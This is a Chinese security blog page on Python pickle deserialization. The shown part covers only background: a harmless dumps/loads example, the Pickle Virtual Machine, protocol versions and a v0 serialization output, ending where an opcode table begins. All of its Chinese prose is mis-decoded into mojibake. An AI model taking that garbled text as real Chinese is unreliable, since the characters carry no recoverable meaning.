

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, ÂçöÂÆ¢, ‰ø°ÊÅØÂÆâÂÖ®">
  
    <meta name="description" content="Â±ÖÂÆ∂ÈöîÁ¶ªÂÆûÂú®ÊòØÂ§™Êó†ËÅä‰∫ÜÔºåÊõ¥‰∏ÄÁØáÊñáÁ´†Âêß„ÄÇ">
<meta property="og:type" content="article">
<meta property="og:title" content="SecMap - ÂèçÂ∫èÂàóÂåñÔºàPythonÔºâ">
<meta property="og:url" content="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="Â±ÖÂÆ∂ÈöîÁ¶ªÂÆûÂú®ÊòØÂ§™Êó†ËÅä‰∫ÜÔºåÊõ¥‰∏ÄÁØáÊñáÁ´†Âêß„ÄÇ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
<meta property="article:published_time" content="2022-02-03T18:00:00.000Z">
<meta property="article:modified_time" content="2025-04-15T14:01:31.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="SecMap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
  
  
  
  <title>SecMap - ÂèçÂ∫èÂàóÂåñÔºàPythonÔºâ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"‰∏®","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"üåß"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                È¶ñÈ°µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ÁîüÂëΩÁ∫ø
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Ê†áÁ≠æ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                ÂàÜÁ±ª
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                ÊëÑÂΩ±ÈõÜ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                ÂÖ≥‰∫é
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SecMap - ÂèçÂ∫èÂàóÂåñÔºàPythonÔºâ"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-02-03 18:00" pubdate>
          2022Âπ¥2Êúà3Êó• 18:00:00
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          27k Â≠ó
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          169 ÂàÜÈíü
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ÁªèÈ™åÊÄªÁªì"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        ÁªèÈ™åÊÄªÁªì
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 Âπ¥Â∫¶ÊÄªÁªì"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 Âπ¥Â∫¶ÊÄªÁªì</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021ÔºåÊù•Á´ã‰∫õ flag Âêß"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021ÔºåÊù•Á´ã‰∫õ flag Âêß</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 Âπ¥Â∫¶ÊÄªÁªì"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 Âπ¥Â∫¶ÊÄªÁªì</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 Âπ¥Â∫¶ÊÄªÁªì"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 Âπ¥Â∫¶ÊÄªÁªì</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 ‰∫ëÂçó‰πãÊóÖ"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 ‰∫ëÂçó‰πãÊóÖ</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 Âπ¥Â∫¶ÊÄªÁªì"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 Âπ¥Â∫¶ÊÄªÁªì</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 üá´üáØ ÊñêÊµé‰πãÊóÖ"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 üá´üáØ ÊñêÊµé‰πãÊóÖ</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF ÊåáÂåó"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF ÊåáÂåó</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF ÊùÇÈ°π‰πãÈöêÂÜôÊúØ"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF ÊùÇÈ°π‰πãÈöêÂÜôÊúØ</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS ÂÆâÂÖ®Ôºà‰∏ÄÔºâÔºöÂü∫Á°ÄÁü•ËØÜÂ§ç‰π†"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS ÂÆâÂÖ®Ôºà‰∏ÄÔºâÔºöÂü∫Á°ÄÁü•ËØÜÂ§ç‰π†</span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ËøáÁ®ãËÆ∞ÂΩï"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        ËøáÁ®ãËÆ∞ÂΩï
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 Âº∫ÁΩëÊùØ‰∏âÈÅì pyjail ÁöÑÈ¢òËß£"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 Âº∫ÁΩëÊùØ‰∏âÈÅì pyjail ÁöÑÈ¢òËß£</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SecMap - ÂèçÂ∫èÂàóÂåñÔºàPythonÔºâ</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö2 ‰∏™ÊúàÂâç
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>Â±ÖÂÆ∂ÈöîÁ¶ªÂÆûÂú®ÊòØÂ§™Êó†ËÅä‰∫ÜÔºåÊõ¥‰∏ÄÁØáÊñáÁ´†Âêß„ÄÇ</p>
<span id="more"></span>
<h2 id="‰ªãÁªç">‰ªãÁªç</h2>
<p>‰∏é PHP ÂèçÂ∫èÂàóÂåñÁ±ª‰ººÔºåPython ÂèçÂ∫èÂàóÂåñ‰πüÊòØ‰∏∫‰∫ÜËß£ÂÜ≥ÂØπË±°‰º†Ëæì‰∏éÊåÅ‰πÖÂåñÂ≠òÂÇ®ÈóÆÈ¢ò„ÄÇ</p>
<h3 id="Áõ∏ÂÖ≥Â∫ìÂíåÊñπÊ≥ï">Áõ∏ÂÖ≥Â∫ìÂíåÊñπÊ≥ï</h3>
<p>Âú® Python ‰∏≠ÂÜÖÁΩÆ‰∫ÜÊ†áÂáÜÂ∫ì <code>pickle</code>/<code>cPickle</code>Ôºà3.x ÊîπÂêç‰∏∫ <code>_pickle</code>ÔºâÔºåÁî®‰∫éÂ∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñÁöÑÂêÑÁßçÊìç‰ΩúÔºàPython ÁöÑÂÆòÊñπÊñáÊ°£‰∏≠ÔºåÁß∞ÂÖ∂‰∏∫ Â∞ÅÂ≠ò/Ëß£Â∞ÅÔºåÊÑèÊÄùÂÖ∂ÂÆûÂ∑Æ‰∏çÂ§öÔºâÔºåÊØîËæÉÂ∏∏ËßÅÁöÑÂΩìÁÑ∂ÊòØ <code>dumps</code>ÔºàÂ∫èÂàóÂåñÔºâÂíå <code>loads</code>ÔºàÂèçÂ∫èÂàóÂåñÔºâÂï¶„ÄÇÂÖ∂‰∏≠ <code>pickle</code> ÊòØÁî® Python ÂÜôÁöÑÔºå<code>cPickle</code> ÊòØÁî® C ËØ≠Ë®ÄÂÜôÁöÑÔºåÈÄüÂ∫¶ÂæàÂø´Ôºå‰ΩÜÊòØÂÆÉ‰∏çÂÖÅËÆ∏Áî®Êà∑‰ªé <code>pickle</code> Ê¥æÁîüÂ≠êÁ±ª„ÄÇ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test)<br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)<br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure>
<p>ÁªìÊûúÂ¶Ç‰∏ãÔºö<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94)<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>94&#125;<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>01a<span class="hljs-char escape_">\x</span>94K<span class="hljs-char escape_">\x</span>01sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
<p>Á¨¨‰∏ÄË°åÁúãËµ∑Êù•ÂæàÂ§çÊùÇÔºüÈ©¨‰∏äËØ¥Âà∞„ÄÇ</p>
<h3 id="pvm">PVM</h3>
<p>Ë¶ÅÂØπÂ∫èÂàóÂåñ„ÄÅÂèçÂ∫èÂàóÂåñÂæàÊ∏ÖÊ•öÁöÑËØùÔºå‰∏ÄÂÆöË¶Å‰∫ÜËß£ PVMÔºåËøôËÉåÂêéÂèàÊúâÈùûÂ∏∏Â§öÁöÑÁªÜËäÇ„ÄÇ</p>
<p>È¶ñÂÖàÔºåÂú®Ë∞ÉÁî® pickle ÁöÑÊó∂ÂÄôÔºåÂÆûÈôÖ‰∏äÊòØ <code>class pickle.Pickler</code> Âíå <code>class pickle.Unpickler</code> Âú®Ëµ∑‰ΩúÁî®ÔºåËÄåËøô‰∏§‰∏™Á±ªÂèàÊòØ‰æùÈù† Pickle Virtual Machine(PVM)ÔºåÂú®Êõ¥Ê∑±Â±ÇÂØπËæìÂÖ•ËøõË°åÁùÄÊüêÁßçÊìç‰ΩúÔºå‰ªéËÄåÊúÄÂêéÂæóÂà∞‰∫ÜÈÇ£‰∏≤Â§çÊùÇÁöÑÁªìÊûú„ÄÇ</p>
<p>PVM Áî±‰∏âÈÉ®ÂàÜÁªÑÊàêÔºö</p>
<ol type="1">
<li>Êåá‰ª§Â§ÑÁêÜÂô®Ôºö‰ªéÊµÅ‰∏≠ËØªÂèñ opcode ÂíåÂèÇÊï∞ÔºåÂπ∂ÂØπÂÖ∂ËøõË°åËß£ÈáäÂ§ÑÁêÜ„ÄÇÈáçÂ§çËøô‰∏™Âä®‰ΩúÔºåÁõ¥Âà∞ÈÅáÂà∞ <code>.</code> Ëøô‰∏™ÁªìÊùüÁ¨¶ÂêéÂÅúÊ≠¢ÔºàÁúã‰∏äÈù¢ÁöÑ‰ª£Á†ÅÁ§∫‰æãÔºåÂ∫èÂàóÂåñ‰πãÂêéÁöÑÁªìÊûúÊúÄÂêéÊòØ <code>.</code>Ôºâ„ÄÇÊúÄÁªàÁïôÂú®Ê†àÈ°∂ÁöÑÂÄºÂ∞ÜË¢´‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÂØπË±°ËøîÂõû„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºö
<ol type="1">
<li>opcode ÊòØÂçïÂ≠óËäÇÁöÑ</li>
<li>Â∏¶ÂèÇÊï∞ÁöÑÊåá‰ª§Áî®Êç¢Ë°åÁ¨¶Êù•Á°ÆÂÆöËæπÁïå</li>
</ol></li>
<li>Ê†àÂå∫ÔºöÁî® list ÂÆûÁé∞ÁöÑÔºåË¢´Áî®Êù•‰∏¥Êó∂Â≠òÂÇ®Êï∞ÊçÆ„ÄÅÂèÇÊï∞‰ª•ÂèäÂØπË±°„ÄÇ</li>
<li>ÂÜÖÂ≠òÂå∫ÔºöÁî® dict ÂÆûÁé∞ÁöÑÔºå‰∏∫ PVM ÁöÑÊï¥‰∏™ÁîüÂëΩÂë®ÊúüÊèê‰æõÂ≠òÂÇ®„ÄÇ</li>
</ol>
<p>ÊúÄÂêéÔºåPVM ËøòÊúâÂçèËÆÆ‰∏ÄËØ¥ÔºåËøôÈáåÁöÑÂçèËÆÆÊåáÂÆö‰∫ÜÂ∫îËØ•ÈááÁî®‰ªÄ‰πàÊ†∑ÁöÑÂ∫èÂàóÂåñ„ÄÅÂèçÂ∫èÂàóÂåñÁÆóÊ≥ï„ÄÇ</p>
<h4 id="pvm-ÂçèËÆÆ">PVM ÂçèËÆÆ</h4>
<p>ÂΩìÂâçÂÖ±Êúâ 6 Áßç‰∏çÂêåÁöÑÂçèËÆÆÂèØÁî®Ôºå‰ΩøÁî®ÁöÑÂçèËÆÆÁâàÊú¨Ë∂äÈ´òÔºåËØªÂèñÊâÄÁîüÊàê pickle ÂØπË±°ÊâÄÈúÄÁöÑ Python ÁâàÊú¨Â∞±Ë¶ÅË∂äÊñ∞„ÄÇ</p>
<ol type="1">
<li>v0 ÁâàÂçèËÆÆÊòØÂéüÂßãÁöÑ‚Äú‰∫∫Á±ªÂèØËØª‚ÄùÂçèËÆÆÔºåÂπ∂‰∏îÂêëÂêéÂÖºÂÆπÊó©ÊúüÁâàÊú¨ÁöÑ Python</li>
<li>v1 ÁâàÂçèËÆÆÊòØËæÉÊó©ÁöÑ‰∫åËøõÂà∂Ê†ºÂºèÔºåÂÆÉ‰πü‰∏éÊó©ÊúüÁâàÊú¨ÁöÑ Python ÂÖºÂÆπ</li>
<li>v2 ÁâàÂçèËÆÆÊòØÂú® Python 2.3 ‰∏≠Âä†ÂÖ•ÁöÑÔºåÂÆÉ‰∏∫Â≠òÂÇ® new-style class Êèê‰æõ‰∫ÜÊõ¥È´òÊïàÁöÑÊú∫Âà∂ÔºàÂèÇËÄÉ PEP 307Ôºâ„ÄÇ</li>
<li>v3 ÁâàÂçèËÆÆÊòØÂú® Python 3.0 ‰∏≠Âä†ÂÖ•ÁöÑÔºåÂÆÉÊòæÂºèÂú∞ÊîØÊåÅ bytes Â≠óËäÇÂØπË±°Ôºå‰∏çËÉΩ‰ΩøÁî® Python 2.x Ëß£Â∞Å„ÄÇËøôÊòØ Python 3.0-3.7 ÁöÑÈªòËÆ§ÂçèËÆÆ„ÄÇ</li>
<li>v4 ÁâàÂçèËÆÆÊ∑ªÂä†‰∫é Python 3.4„ÄÇÂÆÉÊîØÊåÅÂ≠òÂÇ®ÈùûÂ∏∏Â§ßÁöÑÂØπË±°ÔºåËÉΩÂ≠òÂÇ®Êõ¥Â§öÁßçÁ±ªÁöÑÂØπË±°ÔºåËøòÂåÖÊã¨‰∏Ä‰∫õÈíàÂØπÊï∞ÊçÆÊ†ºÂºèÁöÑ‰ºòÂåñÔºàÂèÇËÄÉ PEP 3154Ôºâ„ÄÇÂÆÉÊòØ Python 3.8 ‰ΩøÁî®ÁöÑÈªòËÆ§ÂçèËÆÆ„ÄÇ</li>
<li>v5 ÁâàÂçèËÆÆÊòØÂú® Python 3.8 ‰∏≠Âä†ÂÖ•ÁöÑ„ÄÇÂÆÉÂ¢ûÂä†‰∫ÜÂØπÂ∏¶Â§ñÊï∞ÊçÆÁöÑÊîØÊåÅÔºåÂπ∂ÂèØÂä†ÈÄüÂ∏¶ÂÜÖÊï∞ÊçÆÂ§ÑÁêÜÔºàÂèÇËÄÉ PEP 574Ôºâ„ÄÇ</li>
</ol>
<p>‰∏äÈù¢ÈÇ£‰∏™‰ª£Á†ÅÁ§∫‰æãÔºåÊàëÁî®ÁöÑÊòØ py3.8ÔºåÂ¶ÇÊûúË¶ÅÂæóÂà∞ÊòìËØªÁöÑÂ∫èÂàóÂåñÁªìÊûúÔºåÂú® dumps ‰∏≠ÊåáÂÆöÂçèËÆÆÁâàÊú¨Âç≥ÂèØÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)  <span class="hljs-comment"># ÊåáÂÆöÁâàÊú¨</span><br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)  <span class="hljs-comment"># Ê≥®ÊÑèÔºåloads ËÉΩÂ§üËá™Âä®ËØÜÂà´ÂèçÂ∫èÂàóÂåñÁöÑÁâàÊú¨</span><br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure><br />
ÁªìÊûúÂ¶Ç‰∏ãÔºö<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>p0<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Test<span class="hljs-char escape_">\n</span>p1<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>p2<span class="hljs-char escape_">\n</span>Ntp3<span class="hljs-char escape_">\n</span>Rp4<span class="hljs-char escape_">\n</span>(dp5<span class="hljs-char escape_">\n</span>Va<span class="hljs-char escape_">\n</span>p6<span class="hljs-char escape_">\n</span>I1<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
<p>Âú®Â∫èÂàóÂåñÊó∂ÔºåÂçèËÆÆÁâàÊú¨ÊòØËá™Âä®Ê£ÄÊµãÂá∫Êù•ÁöÑÔºåÊâÄ‰ª•ËØ∏Â¶Ç loads ÊñπÊ≥ïÊòØ‰∏çÈúÄË¶ÅÂèÇÊï∞Êù•ÊåáÂÆöÂçèËÆÆÁöÑ„ÄÇ</p>
<p>Áî±‰∫é‰∏çÂêåÁâàÊú¨Âú®Âà©Áî®ÁöÑÊó∂ÂÄôÊ≤°ÊúâÂæàÂ§ßÂå∫Âà´ÔºåÊâÄ‰ª•Êú¨Êñá‰ª•ÊúÄÊòìËØªÁöÑ v0 ÂçèËÆÆ‰∏∫‰æã„ÄÇ</p>
<h4 id="opcode">opcode</h4>
<p>opcode ÊòØ PVM ÁöÑÁÅµÈ≠ÇÔºåÊéßÂà∂Êï¥‰∏™ÊµÅÁ®ãÁöÑËøêË°å„ÄÇÂ∏∏Áî®ÁöÑÊàëÁªôÁøªËØë‰∫Ü‰∏Ä‰∏ãÔºåÂêÑ‰ΩçÁé∞Êü•Áé∞Áî®Â•Ω‰∫Ü„ÄÇ<br />
